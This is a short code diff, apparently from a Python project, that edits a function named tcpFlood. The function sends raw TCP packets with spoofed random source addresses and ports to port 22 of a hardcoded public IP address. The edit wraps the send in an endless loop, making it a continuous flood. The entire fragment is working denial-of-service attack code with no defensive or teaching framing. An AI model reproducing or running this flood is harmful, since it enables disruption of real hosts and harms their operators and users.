@@ -94,16 +94,17 @@ class TCPPacket:
 def tcpFlood():
     dst = '185.43.206.93'
 
-    pak = TCPPacket(
-        randomIP(),
-        randomPort(),
-        dst,
-        22,
-        0b000101001
-    )
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-    for i in range(3):
-        s.sendto(pak.build(), (dst, 0))
+    while True:
+        pak = TCPPacket(
+            randomIP(),
+            randomPort(),
+            dst,
+            22,
+            0b000101001
+        )
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        for i in range(3):
+            s.sendto(pak.build(), (dst, 0))
 
 
 if __name__ == '__main__':
